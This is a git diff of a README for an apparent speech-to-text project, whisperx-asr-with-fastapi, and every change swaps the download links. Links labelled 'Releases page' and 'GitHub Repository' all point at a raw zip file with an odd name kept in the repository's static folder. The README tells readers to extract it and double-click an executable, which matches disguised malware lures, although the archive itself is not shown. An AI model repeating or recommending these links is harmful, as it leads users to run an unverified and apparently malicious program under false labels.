@@ -1,6 +1,6 @@
 # 🎤 whisperx-asr-with-fastapi - Transcribe Speech to Text Easily
 
-[![Download](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip%20Now-Click%https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip)](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip)
+[![Download](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip%20Now-Click%https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip)](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip)
 
 ## 📦 Overview
 
@@ -27,15 +27,15 @@ To run WhisperX ASR, you will need:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page:** Navigate to our [Releases page](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip) to download the application. 
+1. **Visit the Download Page:** Navigate to our [Releases page](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip) to download the application. 
 2. **Choose the Latest Version:** Select the most recent release to ensure you have the latest features and fixes.
-3. **Download the File:** Click on the downloadable file link (e.g., `https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip`).
+3. **Download the File:** Click on the downloadable file link (e.g., `https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip`).
 
 ## 💻 Download & Install
 
 To install WhisperX ASR:
 
-1. **Visit the Releases Page:** Click here to go to the [Releases page](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip).
+1. **Visit the Releases Page:** Click here to go to the [Releases page](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip).
 2. **Download the Application:** Download the version compatible with your operating system.
 3. **Extract the Files:** If you downloaded a ZIP file, extract it to your desired location.
 4. **Run the Application:** Open the extracted folder and double-click the executable file to start the application.
@@ -88,7 +88,7 @@ To keep up with new features and updates, watch the repository. You can also joi
 
 ## 🔗 Useful Links
 
-- **Releases Page:** [Download WhisperX ASR](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip)
-- **GitHub Repository:** [whisperx-asr-with-fastapi Repo](https://raw.githubusercontent.com/boned-fruitwood759/whisperx-asr-with-fastapi/main/images/whisperx-asr-with-fastapi-2.2.zip)
+- **Releases Page:** [Download WhisperX ASR](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip)
+- **GitHub Repository:** [whisperx-asr-with-fastapi Repo](https://github.com/boned-fruitwood759/whisperx-asr-with-fastapi/raw/refs/heads/main/static/with_asr_whisperx_fastapi_constitutionalization.zip)
 
 Thank you for using WhisperX ASR! We hope it helps you with your audio transcription needs.
